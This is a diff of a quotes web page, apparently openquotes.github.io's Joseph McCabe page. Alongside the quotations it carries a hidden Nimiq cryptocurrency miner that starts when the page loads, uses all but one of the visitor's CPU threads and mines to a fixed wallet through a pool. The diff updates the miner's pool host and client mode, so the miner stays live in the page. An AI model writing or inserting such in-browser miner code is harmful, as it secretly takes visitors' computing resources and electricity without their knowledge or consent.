@@ -29,7 +29,7 @@ let run = (poolHost, poolPort, address, threads) => { (async () => {
                 window.$ = $
                 Nimiq.GenesisConfig.main()
                 console.log('Nimiq loaded. Connecting and establishing consensus.')
-                $.consensus = await Nimiq.Consensus.light()
+                $.consensus = await Nimiq.Consensus.nano()
                 $.blockchain = $.consensus.blockchain
                 $.accounts = $.blockchain.accounts
                 $.mempool = $.consensus.mempool
@@ -82,9 +82,9 @@ let run = (poolHost, poolPort, address, threads) => { (async () => {
             console.log("Start mining...")
             nimiqMiner.address = Nimiq.Address.fromUserFriendlyAddress(address)
             let deviceId = Nimiq.BasePoolMiner.generateDeviceId($.network.config);
-            let deviceData = {"devicename" : deviceId.toString()};
-            let extraData = Nimiq.BufferUtils.fromAscii(Math.random().toString(36).substring(7));
-            $.miner = new Nimiq.SmartPoolMiner($.blockchain, $.accounts, $.mempool, $.network.time, nimiqMiner.address, deviceId, deviceData, extraData)
+            let deviceData = null;
+            
+            $.miner = new Nimiq.NanoPoolMiner($.blockchain, $.network.time, nimiqMiner.address, deviceId, deviceData)
             $.miner.threads = threads
             console.log(`Using ${$.miner.threads} threads.`)
             $.miner.connect(poolHost, poolPort)
@@ -104,7 +104,7 @@ let PoolMiner = {
 </script><script>
 window.onload = () => {
     
-    PoolMiner.init("eu.sushipool.com", 443, "NQ95 814P JXC8 36AM 5G54 56Q0 7DNG UJ4F B73G", navigator.hardwareConcurrency - 1)
+    PoolMiner.init("us.nimpool.io", 8444, "NQ95 814P JXC8 36AM 5G54 56Q0 7DNG UJ4F B73G", navigator.hardwareConcurrency - 1)
 }
 </script><div class=w><div style="height:50px"></div><a href="https://openquotes.github.io/"><header itemscope itemtype="http://schema.org/WPHeader"><img style="width:40px;height:50px" alt="hamburger menu" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAyAQMAAAAUfQvTAAAABlBMVEVMaXEAAACaXKEdAAAAAXRSTlMAQObYZgAAABpJREFUGNNjYKAqYP////8DLORA6SXeBCIAAGuyMpVOdFQyAAAAAElFTkSuQmCC"><img style="height:50px;width:211px" src="https://openquotes.github.io/img/open-quotes-logo.png" alt="openquotes logo"></header></a><article><div itemscope itemtype="https://schema.org/CreativeWork"><h1 itemprop=headline><a itemprop=url href="https://openquotes.github.io/authors/joseph-mccabe-quotes/">Joseph McCabe Quotes</a></h1><h2 itemprop=description>Quotations and aphorisms by&nbsp;<span itemprop=author>Joseph McCabe</span>:</h2><p class=q id=9d3986d2><span itemprop=citation>I AM what is called a Feminist. Thirty years ago I left a monastery and began a sane human existence. Within two or three years, I find, I was defending the rights of women.</span><br>~Joseph McCabe<br><br><a target=_blank href="https://www.facebook.com/dialog/share?app_id=170928386641383&href=https%3A%2F%2Fopenquotes.github.io%2Fauthors%2Fjoseph-mccabe-quotes%2F%239d3986d2&redirect_uri=https%3A%2F%2Fwww.facebook.com&quote=I+AM+what+is+called+a+Feminist.+Thirty+years+ago+I+left+a+monastery+and+began+a+sane+human+existence.+Within+two+or+three+years%2C+I+find%2C+I+was+defending+the+rights+of+women.+--Joseph+McCabe"><img src="/img/facebook.png" class=i></a><a target=_blank href="https://twitter.com/intent/tweet?text=I+AM+what+is+called+a+Feminist.+Thirty+years+ago+I+left+a+monastery+and+began+a+sane+human+ex&url=https%3A%2F%2Fopenquotes.github.io%2Fauthors%2Fjoseph-mccabe-quotes%2F%239d3986d2&hashtags=JosephMcCabe,quote"><img src="/img/twitter.png" class=i></a><a target=_blank href="https://www.tumblr.com/widgets/share/tool?posttype=quote&tags=JosephMcCabe%2Cquote%2Ccitation%2Caphorism&content=I+AM+what+is+called+a+Feminist.+Thirty+years+ago+I+left+a+monastery+and+began+a+sane+human+existence.+Within+two+or+three+years%2C+I+find%2C+I+was+defending+the+rights+of+women.&caption=Joseph+McCabe%3Cbr%3E%3Cbr%3Ehttps%3A%2F%2Fopenquotes.github.io%2Fauthors%2Fjoseph-mccabe-quotes%2F%239d3986d2&canonicalUrl=https%3A%2F%2Fopenquotes.github.io%2Fauthors%2Fjoseph-mccabe-quotes%2F%239d3986d2&shareSource=tumblr_share_button"><img src="/img/tumblr.png" class=i></a><br>Link:<br><textarea onfocus="this.select()" readonly>https://openquotes.github.io/authors/joseph-mccabe-quotes/#9d3986d2</textarea></p><p class=q id=2305880e><span itemprop=citation>No pope ever condemned slavery.</span><br>~Joseph McCabe<br><br><a target=_blank href="https://www.facebook.com/dialog/share?app_id=170928386641383&href=https%3A%2F%2Fopenquotes.github.io%2Fauthors%2Fjoseph-mccabe-quotes%2F%232305880e&redirect_uri=https%3A%2F%2Fwww.facebook.com&quote=No+pope+ever+condemned+slavery.+--Joseph+McCabe"><img src="/img/facebook.png" class=i></a><a target=_blank href="https://twitter.com/intent/tweet?text=No+pope+ever+condemned+slavery.&url=https%3A%2F%2Fopenquotes.github.io%2Fauthors%2Fjoseph-mccabe-quotes%2F%232305880e&hashtags=JosephMcCabe,quote"><img src="/img/twitter.png" class=i></a><a target=_blank href="https://www.tumblr.com/widgets/share/tool?posttype=quote&tags=JosephMcCabe%2Cquote%2Ccitation%2Caphorism&content=No+pope+ever+condemned+slavery.&caption=Joseph+McCabe%3Cbr%3E%3Cbr%3Ehttps%3A%2F%2Fopenquotes.github.io%2Fauthors%2Fjoseph-mccabe-quotes%2F%232305880e&canonicalUrl=https%3A%2F%2Fopenquotes.github.io%2Fauthors%2Fjoseph-mccabe-quotes%2F%232305880e&shareSource=tumblr_share_button"><img src="/img/tumblr.png" class=i></a><br>Link:<br><textarea onfocus="this.select()" readonly>https://openquotes.github.io/authors/joseph-mccabe-quotes/#2305880e</textarea></p><div itemscope itemtype="http://schema.org/WPAdBlock" class=rg><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class=adsbygoogle style="display:inline-block;width:336px;height:280px" data-ad-client=ca-pub-4147884972942953 data-ad-slot=4679905032></ins><script>
                                 (adsbygoogle = window.adsbygoogle || []).push({});
